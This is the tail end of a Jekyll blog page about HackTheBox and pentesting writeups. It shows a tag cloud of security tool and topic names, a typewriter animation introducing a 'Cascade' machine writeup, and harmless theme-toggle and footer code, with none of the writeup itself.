href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
  




<script>
  let i = 0;
  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada CASCADE AD';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
